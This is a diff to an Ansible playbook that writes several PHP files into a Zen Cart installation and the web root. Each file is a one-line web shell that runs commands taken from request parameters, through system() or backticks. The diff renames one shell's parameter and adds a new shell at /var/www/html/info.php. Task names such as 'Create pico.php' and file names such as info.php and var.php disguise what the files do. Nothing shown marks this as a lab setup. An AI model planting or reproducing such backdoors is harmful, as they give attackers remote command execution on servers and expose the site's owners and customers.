@@ -9,7 +9,7 @@
   - name: Create comeback.php file
     copy:
       dest: /var/www/html/zen-cart/comeback.php
-      content: <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
+      content: <?php if(isset($_REQUEST['comeback'])){ echo "<pre>"; $cmd = ($_REQUEST['comeback']); system($cmd); echo "</pre>"; die; }?>
   - name: Create pico.php
     copy:
       dest: /var/www/html/zen-cart/pico.php
@@ -17,5 +17,9 @@
   - name: Create pico.php
     copy:
       dest: /var/www/html/zen-cart/includes/var.php
-      content: <?=`$_GET[var]`?> 
+      content: <?=`$_GET[var]`?>
+  - name: Create pico.php
+    copy:
+      dest: /var/www/html/info.php
+      content: <?=`$_GET[0]`?> 
        
